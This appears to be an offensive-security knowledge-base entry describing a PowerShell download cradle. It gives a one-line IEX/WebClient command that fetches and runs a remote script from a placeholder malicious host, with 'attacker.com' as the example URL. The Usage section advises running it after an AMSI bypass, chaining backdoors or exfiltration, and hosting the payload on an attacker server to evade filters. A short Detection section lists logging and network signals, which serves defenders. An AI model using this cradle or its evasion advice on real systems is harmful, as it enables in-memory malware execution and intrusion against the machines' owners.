---
id: 25874fbf-0efa-4030-b59f-0ab958bf0879
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:25.939660+00:00'
updated_at: '2023-04-10T20:36:18.324197+00:00'
platforms:
  - Windows
tags:
  - download-cradle
  - powershell
  - execution
validated: true
---

# PowerShell-WebClient-Download-and-Execute

## Code

```powershell
IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
```

## Description

This PowerShell code snippet acts as a download cradle, using .NET WebClient to fetch a remote script and Invoke-Expression (IEX) to execute it immediately. It is designed for in-memory payload delivery, avoiding disk writes that could trigger AV detection. In the context of AMSI bypass, this allows running malicious scripts that would otherwise be scanned and blocked.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| https://maliciousscripturl/malicious.ps1 | URL of the remote PowerShell script to download and execute | https://attacker.com/payload.ps1 |

## Usage

Execute this code in a PowerShell session after applying an AMSI bypass like DLL hijacking. It is typically used in initial execution or post-exploitation to chain additional payloads, such as installing backdoors or exfiltrating data. Ensure the URL is HTTPS to evade some network filters, and host the script on an attacker-controlled server.

## Detection

- PowerShell logging (Module Logging, Script Block Logging) will capture the IEX invocation and downloaded content.
- Network monitoring for connections to suspicious domains or unexpected PowerShell outbound traffic.
- AMSI-enabled environments may still log attempts if not fully bypassed; look for Event ID 4104 in Windows logs.
- Behavioral analytics detecting WebClient usage in non-browser contexts.

## Related

- [[procedures/Patch-AmsiScanBuffer-via-DLL-Hijacking]]
- [[commands/PowerShell-Invoke-Expression-DownloadCradle]]
